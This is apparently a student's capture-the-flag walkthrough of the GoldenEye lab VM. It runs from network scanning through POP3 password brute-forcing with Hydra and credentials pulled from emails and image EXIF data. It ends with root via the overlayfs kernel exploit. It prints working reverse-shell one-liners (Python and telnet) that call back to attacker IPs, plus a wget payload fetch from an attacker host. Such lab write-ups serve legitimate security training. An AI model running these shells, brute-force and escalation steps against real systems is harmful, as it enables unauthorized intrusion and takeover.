## Target Discovery

###   Tools Used:

#Fping 
   
###   Commands Ran:

```bash
sudo fping -q -a -A -n -s -g 192.168.1.0/24 | tee networkScan
```

```bash
arp -a | grep -i 08:00:27:EE:17:2B
```

###   Findings:

I already had the MAC address of the device and then used fping to send data out and discover what was on the network. I was then able to query my arp table for the MAC address and get the IP address from the device.
    IP Address: 192.168.1.15
    MAC Address: 08:00:27:EE:17:2B

## Target Scanning

###   Tools Used:

#Nmap #Dirb #Sn1per #Burp 

###   Commands Ran:

```bash
ipAddress=192.168.1.15
```

```bash
sudo nmap -T4 -O -sV -sC -p- -oN targetScan $ipAddress
```

```bash
dirb http://$ipAddress/
```

```bash
sudo sniper -t $ipAddress
```

```bash
telnet 192.168.1.15 25
```

```bash
telnet 192.168.1.15 55007
```

###   Findings:

![[Images/GoldenEye/nmapScan.png]]

| Port  | Service     | Version                    |
| ----- | ----------- | -------------------------- |
| 25    | SMTP        | Postfix smtpd              |
| 80    | HTTP        | Apache httpd 2.4.7         |
| 55006 | SSL/POP3    | Dovecot pop3d              |
| 55007 | pop3        | Dovecot pop3d              |

#### #SMTP

SMTP is usually used as a mail relay/server, will need to see if there are any vulnerabilities with this or not.

I can telnet into the server and can verify that Boris and Natalya are users, but it won't let me attempt to log in as either of them

#### #HTTP

HTTP open usually means web server, will need to check to see if there is a page open.

Dirb returned two results
    - index.html
    - server-status

This being the case, I do not believe that there is much there but I am going to check the page anyway

After going to the page I am met with a page saying that this is the "Servernaya Auxiliary Control Station" and to navigate to "/sev-home/" to login.

When I went there I got a login pop up.

Maybe need to make a word list with sev- as the started and then see if that finds anything else

Using Burp, I was able to see the source code of the home page that is a fake terminal written in java script.
In the source there is a comment telling Boris that he need to change his password and that it is encoded below
It then says that Natalya says that she can break Boris' codes

![[CommentsInSourceCode.png]]

When I highlighted the text for the encoded password, Burp decoded it for me and the text reads: "InvincibleHack3r"

![[decodedPassword.png]]

Now that I have the password I will need to get a username, I have two names, Boris and Natalya, but I am not sure that these will work as usernames. I am going to try it once and see but don't want to lock the account out

The username "boris" and password "InvincibleHack3r" worked to log in to the site

When I logged in I was met with a screen that told me that I could email a GNO supervisor to receive training to be an administrator and to remember that the POP3 server is run off high unused ports because security through obscurity works really well

![[sev-homeLoggedIn.png]]

In the comments of the source code on this page it tells us that the GNO Supervisors are Natalya and Boris

![[sev-homeSource.png]]

From here I am going to move to the POP3 side and maybe the SMTP port as well to see if there is anything vulnerable there now that I have credentials and an idea of what to look for

One thing I missed before is the line in the first source code comments that tells Boris to change his default password. I thought that the password that needed changed was the one in the message but it was talking about his password into the server.


#### #Dovecot / #POP3

What is Dovecot pop3d?
    It is an open source IMAP and POP3 server for unix OS. Written with security in mind. 
 
Default port is 143 so it is interesting that is is 55006/7 in this case. 
    55006 and 55007 are not commonly used, security through obscurity? Maybe the traffic won't be filtered or protected at all because it is "hidden" 

Using POP3 I should be able to download emails from the server if there is a vulnerability or if I can get access somehow with the credentials I have already or if it just isn't secured since they are using security through obscurity

There are a couple of exploits for Dovecot. I am going to try 2 of them. 
    - Remote email disclosure
    - Remote command injection (Metasploit)

These did not work because the server wasn't set up with the bad configurations

##  Enumeration

###    Tools Used:

#Hydra #Linpeas #Python 

###    Findings:

#### Password Breaking

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f pop3://192.168.1.15:55007
```
```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f pop3://192.168.1.15:55007
```
```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f pop3://192.168.1.15:55007
```

Using Hydra I was able to crack Boris' password into the POP3 server and get logged in as him. The password is "secret1!" 

![[hydraBoris.png]]

![[loggedInBoris.png]]

Using Hydra, I was able to crack Natalya's password into the POP3 server. Her password is "bird"

![[hydraNatalyaEmail.png]]

![[loggedInNatalya.png]]

Using Hydra, I was able to crack Doak's password as well. Password is "goat"

![[hydraDoak.png]]

![[loggedInDoak.png]]

#### POP3 Server

Now that I have access to the system I can see all of Boris' emails

![[BorisInbox.png]]

![[BorisEmail1.png]]

![[BorisEmail2.png]]

![[BorisEmail3.png]]

It seems that according to email 3, Boris has something in his email that he put onto the server that is important.

According to email 1, emails don't get scanned and Boris is an admin.
This could be useful if there is something here that is leaked or maybe if Boris has access to other mailboxes

We also see a couple new people mentioned. Root, Alec, and Xenia.

Xenia seems important and I need to look and see what else I can find on them

Xenia is not a user in the POP3 server. There must be another way in through the server or through HTTP

Now that I am logged in as Natalya I can see her inbox and emails

![[NatalyaInbox.png]]

![[NatalyaEmail1.png]]

![[NatalyaEmail2.png]]

We can see that Janus, which is in Boris' emails, is a crime syndicate of some sort that is after Golden Eye

In email 2, we now have credentials into the system and a new host name to point the server to in order to log in
    The email gives instructions to point your /etc/hosts file to severnaya-station.com
    Username: xenia
    Password: RCP90rulez!

Now that I am logged in as Doak, I can see his inbox and emails

![[DoakInbox.png]]

![[DoakEmail1.png]]

It seems that Doak is in on something and is giving us or someone his username and password to the system
    Username: "dr_doak"
    Password: "4England!"

#### #HTTP 

After changing my hosts file to point to the new server name, I was able to get to the new site identified

![[severnayaHomepage.png]]

There is a login button at the top right as well a text box on the right that says to message the admin if you have any questions. It then tells us that the user is admin
    New user identified: admin

When I click into the course that is listed on the page, I am brought to a login screen or asked to continue as guest, if I click continue as guest I get told that guest is not allowed to access this course

![[Images/GoldenEye/loginPage.png]]

Since there is also a forgot username and password place I am thinking that I might be able to reset the admin password since I have the username but no password

I was able to log in as Xenia, but there are no courses that I am enrolled in. I do however have a message from a "Dr. Doak"

![[DrDoakMessagetoXenia.png]]

According to this message, doak is a new user that we can see about accessing in the POP3 system for some more new information

After getting into Dr. Doak's email and getting his username and password into the system. I am now logged in as him and not Xenia.

![[loggedInasDoakSevernaya.png]]

Just from the homepage we cannot see anything different, but he might actually be in courses or have some files since he said to ex-filtrate some data

Looking around his private files I found a folder titled "for James" that has a text document call "s3cret.txt"

![[DoakPrivateFiles.png]]

After downloading and reading the document, I found that I need to look for something juicy at "/dir007key/for-007.jpg" and that Dr. Doak was able to get the admin credentials in clear text but can't send them to us

![[Doaks3cretFile.png]]

After going to that file location in the browser I was able to access the image and see what Dr. Doak left

![[DoakJuicyImage.png]]

Using the password that I got from the image, I was able to log into the website as the admin user

![[loggedInAdmin.png]]

I can now see a list of users that have access to the site

![[userList.png]]

I am going to try and change the password of Boris and Natalya to see if I can get in to their accounts and see what files they have

I was able to reset the password for both accounts to "Password1!"
    Usernames: "boris" & "natalya"

Using the password that I reset I was able to log in to Boris' account
    There doesn't seem to be anything on his account

Using the password that I reset I was able to log in to Natalya's account
    There doesn't seem to be anything on her account

Looking back over the admin page I was able to find a settings page with the server paths in it and inside one of them is the following code
    sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
This is some type of reverse shell that is trying to build. I am going to see if I can make this work for me instead

![[reverseShellOnSite.png]]

The problem I am running in to is figuring out how to get it to run.
I have a listener open, but I don't think that the code is actually starting.


#### #Stegonography

After saving the image to my machine I was able to look at the EXIF data and see that there was a description that seemed to be encrypted

![[imageEXIFData.png]]

```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
```

When I decrypted that description I got what I am assuming is the admin password to the site
    Username: admin
    Password: xWinter1995x!

![[decryptedAdminPassword.png]]

#### #Reverse_Shell 

I first had to change the spell checker that the system was using in the system plugin settings

I was then able to obtain a reverse shell by opening a listener
```bash
nc -lnvp 4444
```
Then add the following line into the spell check file location
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

When I then go into a text box and tell it to spellcheck for me it pops the reverse shell

Now that I have a shell open I have to stabilize it to get a TTY shell by running 
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

![[shellConnection.png]]

#### #Priv_Esc

As shown above, I checked my user and groups by running "id" and I am "www-data" but am not a part of any groups

I tried to check my sudo permission by running "sudo -l" but I do not have a password for my user and a blank password did not work

When checking my home directory, there are two different directories there:
    html: expected
    moodledata: site hosted
Inside of html is where all of the site pages are stored and there are more here that I have not been able to get to

![[homeDir.png]]

Found an interesting page called "splashAdmin.php" 

![[splashAdminText.png]]

![[splashAdminPage.png]]

The admin mentioned something about an alternative to GCC compiler. This could be something to exploit but I need to find what they are using. The only thing to go off of is that freeBSD uses it
    CLANG seems to be what the alternative is

I found another directory called "006-final" that has a directory in it with a another page called "xvf7-flag"

![[fakeFlagPageText.png]]

![[fakeFlagPage.png]]

As shown above, there doesn't seem to really be anything here and it just seems like it is a goose chase, keeping note just in case though

##### #Linpeas 

I am now running linpeas from the tmp directory to see what I can get

Found a bad Linux version of 3.13.0-32-generic
    This seems to be for kernel exploits, don't want to mess with the kernel
Found a bad gcc version of 4.8.2
    This is for buffer overflows it seems

![[OSVersions.png]]

Found a .htpaswd file with a couple of hashes in it, not sure what to though

```
boris:$apr1$vg2drJim$wUDKP9TLw5jq4GS5jq2240
```
```
ops:$apr1$mVvEblRU$oHDbEs4QP2YTUG25Z1PoP.
```

![[htpasswdHashes.png]]

```bash
hash-identifier $apr1$vg2drJim$wUDKP9TLw5jq4GS5jq2240
```

```bash
hashcat -m 1600 -a 0 htpasswdHashes.txt /usr/share/wordlists/rockyou.txt
```

Cracked the "ops" password
    password: 123
    Unfortunately the password goes to the sev-home page and doesn't give any extra info

Possible SSH Keys found

![[sshFiles.png]]

SSH is not open on this box, so it might be an ssl key

Found some usernames and passwords in config PHP files

![[PHPConfigCreds.png]]

CVE-List:
    dirtycow
    dirtycow 2
    overlays
    sudo baron samedit 2
    dccp
    usb-midi
    overlays (ovl_setattr)
    fuse (fusermount)
    nft_object UAF (NFT_MSG_NEWSET)
    sudo baron samedit
    Netfilter heap out-of-bounds write
    sudo pwfeedback
    XFRM_UAF
    rationalLove
    af_packet
    linux_ldso_hwcap_64
    PIE_stack_corruption
    BUFFORCE
    BadIRET
    esofix64_NMI
    fuse_suid
    inode_capable
    rawmodePTY
    timeoutpwn
    timeoutpwn 2
    keyring


##### PostgreSQL Search

Found the config file at "/etc/postgresql/9.3/main"
    Data Directory: "/var/lib/postgresql/9.3/main"
    HBA File: "/etc/postgresql/9.3/main/pg_hba.conf"

![[postgresqlFileLocations.png]]

Connections and Authentication 

![[postgresqlConnectionandAuth.png]]

##### #Sticky_Bit

Finding all files that have the sticky bit turned on
```bash
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```

I was able to get 20 different files that have the sticky bit set

![[stickyBitList.png]]

![[mtr.png]]

#### Moodle

Moodle version 2.2.3

![[moodleConfig.png]]

Now I know that there is a postgresql database running with the Moodle server and I have a username and password. I just need to figure out how to connect to it and how to use that for something else
    So far I cannot connect to the database because it is set to peer authentication and not password and I cannot edit the file to use password instead of peer

##### Overlays Exploit

Looking at the Overlays exploit, and with a hint from the team, this seems to be the way into the system

This exploit will give us root permission on mounting to the system and then sending that mount to root and not checking our permissions

https://www.exploit-db.com/exploits/37292

I got the POC from here and then was able to copy that on my machine and create a file called overlays.c

I then hosted an http server using 
```python
python -m http.server 5555
```

and then used wget to get the file onto the machine
```bash
wget http://192.168.1.18:5555/overlays.c
```

I then used clang to compile the C code into an exploit 
```bash
clang overlays.c -o exploit
```

I then ran the exploit but got an error saying that gcc was not installed on the system
    I found the line that called gcc and changed it to clang and followed the above process again

When I ran the exploit this time, I was met with a new shell prompt but it was not a TTY shell so I got a TTY shell
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

I then ran ID and found that I was root

I moved into the /root directory and found the flag text file and read it to get the flag

##  Root Access Obtained

![[gotRoot.png]]